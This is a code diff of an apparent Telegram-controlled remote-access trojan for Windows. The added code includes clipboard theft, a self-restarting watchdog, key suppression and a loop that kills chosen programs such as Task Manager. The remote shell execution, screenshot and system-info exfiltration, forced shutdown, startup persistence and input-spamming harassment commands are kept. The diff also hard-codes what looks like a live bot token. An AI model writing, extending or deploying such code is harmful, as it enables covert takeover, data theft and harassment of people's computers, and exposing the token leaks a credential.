@@ -18,12 +18,25 @@ import keyboard as kb
 from pycaw.pycaw import AudioUtilities, IAudioEndpointVolume
 from comtypes import CLSCTX_ALL, CoInitialize, CoUninitialize
 import pygame
+import pyperclip
 
-bot_token = 'your bot token from -> @BotFather'
+bot_token = '7615104148:AAFk0NVPm-tpooR-83rY7tpFHr0K58VpIHk'
 bot = telebot.TeleBot(bot_token)
 
-devices = {}
 cmd_spam_processes = []
+
+def restart_on_exit():
+    parent_pid = os.getpid() 
+    monitor_thread = threading.Thread(target=monitor_process, args=(parent_pid,))
+    monitor_thread.daemon = True
+    monitor_thread.start()
+
+def monitor_process(parent_pid):
+    while True:
+        if not psutil.pid_exists(parent_pid): 
+            python = sys.executable  
+            os.execl(python, python, *sys.argv)  
+        time.sleep(1)
 
 def keyboard():
     markup = types.ReplyKeyboardMarkup(one_time_keyboard=True, resize_keyboard=True)
@@ -50,26 +63,121 @@ def send_welcome(message):
         message.chat.id,
         "Welcome to the multi-device bot!\n\n"
         "Commands:\n"
-        "/devices - List all registered devices\n"
-        "/cmd <command> - Run command on a specific device or all devices\n"
-        "/screen - Take screenshot on a specific device or all devices\n"
-        "/info - Get system info of a specific device or all devices\n"
-        "/shutdown - Shutdown a specific device or all devices\n"
-        "/explorer_spam - Spam File Explorer on a specific device or all devices\n"
-        "/stop_explorer_spam - Stop File Explorer spam on a specific device or all devices\n"
-        "/open_url <url> - Open a URL in the default browser on a specific device or all devices\n"
-        "/stop_url - stops links from opening"
-        "/cmd_spam <command> - Spam CMD with a specific command on a specific device or all devices\n"
-        "/stop_cmd_spam - Stop CMD spam on a specific device or all devices\n"
-        "/photo - puts up a custom wallpaper\n"
-        "/mouse x y - moves the mouse to a given position\n"
-        "/mouse_spam - moves the mouse to random positions\n"
-        "/mouse_spam_stop - stops the mouse from moving\n"
-        "/keyboard word/letter - writes any letter/word 1 time\n"
-        "/keyboard_spam word/letter - spams an infinitely specified letter/word\n"
-        "/keyboard_spam_stop - stops keyboard spam\n"
-        "/sound - makes creepy sounds\n"
+        "/cmd <command> - Run a command\n"
+        "/screen - Take a screenshot\n"
+        "/info - Get system information\n"
+        "/shutdown - Shutdown the system\n"
+        "/explorer_spam - Spam File Explorer windows\n"
+        "/stop_explorer_spam - Stop File Explorer spam\n"
+        "/open_url <url> - Open a URL in the default browser\n"
+        "/stop_url - Stop opening URLs"
+        "/photo - Set a custom wallpaper\n"
+        "/mouse x y - Move the mouse to a specified position\n"
+        "/mouse_spam - Move the mouse to random positions repeatedly\n"
+        "/mouse_spam_stop - Stop random mouse movements\n"
+        "/keyboard word/letter - Type a specified letter or word once\n"
+        "/keyboard_spam word/letter - Spam a specified letter or word infinitely\n"
+        "/keyboard_spam_stop - Stop keyboard spamming\n"
+        "/sound - Play creepy sounds\n"
+        "/block_app - Block a specific application\n"
+        "/stop_blocking_app - Unblock all applications\n"
+        "/block_keys - Block specific keys\n"
+        "/unblock_keys - Unblock all keys\n"
+        "/buffer - Retrieve the computer's buffer information\n"
     )
+    
+@bot.message_handler(commands=['buffer'])
+def unblock_keys(message):
+    args = message.text.split(' ')
+    if len(args) < 1:
+        bot.send_message(message.chat.id, "Usage: /buffer")
+        return
+    
+    clipboard_content = pyperclip.paste()
+    if clipboard_content:
+        bot.send_message(message.chat.id, clipboard_content)
+    else:
+        bot.send_message(message.chat.id, "buffer is empty")
+
+blocking_thread = None
+blocking_active = False
+
+@bot.message_handler(commands=['block_keys'])
+def block_keys(message):
+    global blocking_thread, blocking_active
+    args = message.text.split(' ')
+    if len(args) < 2:
+        bot.send_message(message.chat.id, "Usage: /block_keys keys")
+        return
+    
+    keys_to_block = args[1]
+    if blocking_active:
+        bot.send_message(message.chat.id, "Keys are already being blocked.")
+        return
+
+    blocking_active = True
+
+    def block_keys_thread():
+        try:
+            kb.add_hotkey(keys_to_block, lambda: None, suppress=True)
+            bot.send_message(message.chat.id, f"Blocking keys: {keys_to_block}")
+            while blocking_active:
+                time.sleep(1)
+        except Exception as e:
+            bot.send_message(message.chat.id, f"Error in blocking keys: {e}")
+
+    threading.Thread(target=block_keys_thread, daemon=True).start()
+
+@bot.message_handler(commands=['unblock_keys'])
+def unblock_keys(message):
+    global blocking_active
+    if not blocking_active:
+        bot.send_message(message.chat.id, "No keys are currently being blocked.")
+        return
+    
+    blocking_active = False
+    kb.clear_all_hotkeys() 
+    bot.send_message(message.chat.id, "Key blocking stopped.")
+
+start_app_block = True
+
+def block_keys(app_name):
+    global start_app_block
+    while start_app_block:
+        for proc in psutil.process_iter(['name']):
+            if proc.info['name'] == app_name:  
+                proc.kill() 
+        time.sleep(0.5)
+
+@bot.message_handler(commands=['block_app'])
+def block_task_manager(message):
+    global start_app_block
+    try:
+        args = message.text.split(' ')
+        if len(args) < 2:
+            bot.send_message(message.chat.id, "Usage: /block_app app_name.exe")
+            return
+        
+        start_app_block = True
+        app_name = str(args[1])
+        threading.Thread(target=block_keys, args=(app_name,), daemon=True).start()
+        bot.send_message(message.chat.id, f"{app_name} is blocked now.")
+    except Exception as e:
+        print(f"Error in blocking Task Manager: {e}")
+
+@bot.message_handler(commands=['stop_blocking_app'])
+def block_task_manager(message):
+    global start_app_block
+    try:
+        args = message.text.split(' ')
+        if len(args) < 1:
+            bot.send_message(message.chat.id, "Usage: /stop_blocking_app")
+            return
+        
+        start_app_block = False
+        bot.send_message(message.chat.id, "All apps are unblocked now.")
+    except Exception as e:
+        print(f"Error in blocking Task Manager: {e}")
 
 @bot.message_handler(commands=['mouse'])
 def move_mousik(message):
@@ -82,8 +190,7 @@ def move_mousik(message):
         x = int(args[1])
         y = int(args[2])
 
-        for device_id in devices.keys():
-            pyautogui.moveTo(x, y)
+        pyautogui.moveTo(x, y)
         bot.send_message(message.chat.id, f"mouse executed to all")
     except Exception as e:
         bot.send_message(message.chat.id, f"Error: {e}")
@@ -109,16 +216,15 @@ def play_sound(message):
             bot.send_message(message.chat.id, "Usage: /mouse")
             return
 
-        for device_id in devices.keys():
-            set_volume()
-            pygame.init()
-            song = pygame.mixer.Sound('ass.mp3')
-            song.play()
-            
-            time.sleep(song.get_length())
-            
-            pygame.quit()
-            bot.send_message(message.chat.id, "Sound played successfully.")
+        current_user = getpass.getuser()
+
+        set_volume()
+        pygame.init()
+        song = pygame.mixer.Sound(rf'Musics\ass.mp3')
+        song.play()
+        time.sleep(song.get_length())
+        pygame.quit()
+        bot.send_message(message.chat.id, "Sound played successfully.")
     except Exception as e:
         bot.send_message(message.chat.id, f"Error: {e}")
 
@@ -140,9 +246,8 @@ def move_mousik(message):
             bot.send_message(message.chat.id, "Usage: /mouse_spam")
             return
 
-        for device_id in devices.keys():
-            mouse_spam = False
-            threading.Thread(target=mouse_movik, daemon=True).start()
+        mouse_spam = False
+        threading.Thread(target=mouse_movik, daemon=True).start()
         bot.send_message(message.chat.id, f"mouse_spam executed to all")
     except Exception as e:
         bot.send_message(message.chat.id, f"Error: {e}")
@@ -156,8 +261,7 @@ def move_mousik(message):
             bot.send_message(message.chat.id, "Usage: /mouse_spam_stop")
             return
 
-        for device_id in devices.keys():
-            mouse_spam = True
+        mouse_spam = True
         bot.send_message(message.chat.id, f"mouse_spam executed on all")
     except Exception as e:
         bot.send_message(message.chat.id, f"Error: {e}")
@@ -188,12 +292,11 @@ def move_mousik(message):
         else:
             letter = True
 
-        for device_id in devices.keys():
-            if letter == True:
-                kb.press(klavisha)
-            else:
-                kb.write(klavisha, delay=0.1)
-            bot.send_message(message.chat.id, f"keyboard executed on all")
+        if letter == True:
+            kb.press(klavisha)
+        else:
+            kb.write(klavisha, delay=0.1)
+        bot.send_message(message.chat.id, f"keyboard executed on all")
     except Exception as e:
         bot.send_message(message.chat.id, f"Error: {e}")
 
@@ -213,9 +316,8 @@ def move_mousik(message):
         else:
             letter = True
 
-        for device_id in devices.keys():
-            keyboard_start = False
-            threading.Thread(target=Keyboardik, args=(klavisha, letter,), daemon=True).start()
+        keyboard_start = False
+        threading.Thread(target=Keyboardik, args=(klavisha, letter,), daemon=True).start()
         bot.send_message(message.chat.id, f"keyboard_spam executed on all")
     except Exception as e:
         bot.send_message(message.chat.id, f"Error: {e}")
@@ -229,19 +331,10 @@ def move_mousik(message):
             bot.send_message(message.chat.id, "Usage: /keyboard_spam_stop")
             return
 
-        for device_id in devices.keys():
-            keyboard_start = True
+        keyboard_start = True
         bot.send_message(message.chat.id, f"keyboard_spam was stopped to all")
     except Exception as e:
         bot.send_message(message.chat.id, f"Error: {e}")
-
-@bot.message_handler(commands=['devices'])
-def list_devices(message):
-    if not devices:
-        bot.send_message(message.chat.id, "No devices registered.")
-    else:
-        device_list = "\n".join([f"{device_id}: {name}" for device_id, name in devices.items()])
-        bot.send_message(message.chat.id, f"Registered devices:\n{device_list}")
 
 def set_wallpaper(file_id):
     file_info = bot.get_file(file_id)
@@ -269,9 +362,8 @@ def handle_photo(message):
             bot.send_message(message.chat.id, "Usage: /photo")
             return
         
-        for device_id in devices.keys():
-            set_wallpaper(file_id)
-            bot.reply_to(message, f"Обои успешно сохранены для: {devices[device_id]}")
+        set_wallpaper(file_id)
+        bot.reply_to(message, f"Обои успешно сохранены")
     except Exception as e:
         bot.reply_to(message, f"Ошибка при получении фото: {e}")
 
@@ -285,9 +377,8 @@ def run_command(message):
 
         command = args[1]
 
-        for device_id in devices.keys():
-            subprocess.Popen(command, shell=True)
-            bot.send_message(message.chat.id, f"Broadcast command executed on {devices[device_id]}: {command}")
+        subprocess.Popen(command, shell=True)
+        bot.send_message(message.chat.id, f"Broadcast command executed with command: {command}")
     except Exception as e:
         bot.send_message(message.chat.id, f"Error: {e}")
 
@@ -299,12 +390,11 @@ def take_screenshot(message):
             bot.send_message(message.chat.id, "Usage: /screen")
             return
 
-        for device_id in devices.keys():
-            screen_path = os.path.join(os.getenv('APPDATA'), f'Screenshot_{device_id}.jpg')
-            ImageGrab.grab().save(screen_path)
-            with open(screen_path, 'rb') as screen:
-                bot.send_photo(message.chat.id, screen)
-            os.remove(screen_path)
+        screen_path = os.path.join(os.getenv('APPDATA'), f'Screenshot_{1}.jpg')
+        ImageGrab.grab().save(screen_path)
+        with open(screen_path, 'rb') as screen:
+            bot.send_photo(message.chat.id, screen)
+        os.remove(screen_path)
     except Exception as e:
         bot.send_message(message.chat.id, f"Error: {e}")
 
@@ -321,19 +411,18 @@ def get_system_info(message):
             bot.send_message(message.chat.id, "Usage: /info")
             return
 
-        for device_id in devices.keys():
-            username = getpass.getuser()
-            os_info = platform.platform()
-            processor = platform.processor()
-            ip = get_local_ip()
-            bot.send_message(
-                message.chat.id,
-                f"System Info for {devices[device_id]}:\n"
-                f"Username: {username}\n"
-                f"OS: {os_info}\n"
-                f"Processor: {processor}\n"
-                f"IP: {ip}"
-            )
+        username = getpass.getuser()
+        os_info = platform.platform()
+        processor = platform.processor()
+        ip = get_local_ip()
+        bot.send_message(
+            message.chat.id,
+            f"System Info:\n"
+            f"Username: {username}\n"
+            f"OS: {os_info}\n"
+            f"Processor: {processor}\n"
+            f"IP: {ip}"
+        )
     except Exception as e:
         bot.send_message(message.chat.id, f"Error: {e}")
 
@@ -345,9 +434,8 @@ def shutdown_device(message):
             bot.send_message(message.chat.id, "Usage: /shutdown")
             return
 
-        for device_id in devices.keys():
-            os.system('shutdown /s /f /t 0')
-            bot.send_message(message.chat.id, f"Shutdown command executed on {devices[device_id]}.")
+        os.system('shutdown /s /f /t 0')
+        bot.send_message(message.chat.id, f"Shutdown command executed.")
     except Exception as e:
         bot.send_message(message.chat.id, f"Error: {e}")
 
@@ -376,9 +464,8 @@ def explorer_spam(message):
             bot.send_message(message.chat.id, "Usage: /explorer_spam")
             return
 
-        for device_id in devices.keys():
-            threading.Thread(target=open_explorer, daemon=True).start()
-            bot.send_message(message.chat.id, f"Explorer spam executed on {devices[device_id]}.")
+        threading.Thread(target=open_explorer, daemon=True).start()
+        bot.send_message(message.chat.id, f"Explorer spam executed.")
     except Exception as e:
         bot.send_message(message.chat.id, f"Error: {e}")
 
@@ -390,9 +477,8 @@ def stop_explorer_spam(message):
             bot.send_message(message.chat.id, "Usage: /stop_explorer_spam")
             return
 
-        for device_id in devices.keys():
-            kill_explorer()
-            bot.send_message(message.chat.id, f"Stopped Explorer spam on {devices[device_id]}.")
+        kill_explorer()
+        bot.send_message(message.chat.id, f"Stopped Explorer spam.")
     except Exception as e:
         bot.send_message(message.chat.id, f"Error: {e}")
 
@@ -418,10 +504,9 @@ def open_url(message):
         if not (url.startswith("http://") or url.startswith("https://")):
             url = "https://" + url
 
-        for device_id in devices.keys():
-            open_url = False
-            threading.Thread(target=open_links, args=(url,), daemon=True).start()
-            bot.send_message(message.chat.id, f"URL opened on {devices[device_id]}: {url}")
+        open_url = False
+        threading.Thread(target=open_links, args=(url,), daemon=True).start()
+        bot.send_message(message.chat.id, f"URL opened: {url}")
     except Exception as e:
         bot.send_message(message.chat.id, f"Error: {e}")
 
@@ -433,26 +518,14 @@ def open_url(message):
         if len(args) < 1:
             bot.send_message(message.chat.id, "Usage: /stop_url")
             return
-
-        for device_id in devices.keys():
-            open_url = True
-            bot.send_message(message.chat.id, f"URL stopped on {devices[device_id]}")
+        
+        open_url = True
+        bot.send_message(message.chat.id, f"URL stopped")
     except Exception as e:
         bot.send_message(message.chat.id, f"Error: {e}")
 
-device_id = 0
 if __name__ == '__main__':
-    try:
-        while True:
-            device_id += 1
-            if device_id not in devices:
-                break
-        device_name = f"{getpass.getuser()}@{platform.node()} ({socket.gethostname()})"
-        devices[device_id] = device_name
-        print(f"Device registered: {device_name}\nID: {device_id}")
-    except Exception as e:
-        print("Error during registration")
+    restart_on_exit()
 
-    for device_id in devices.keys():
-        add_to_startup_for_device()
+    add_to_startup_for_device()
     bot.polling()
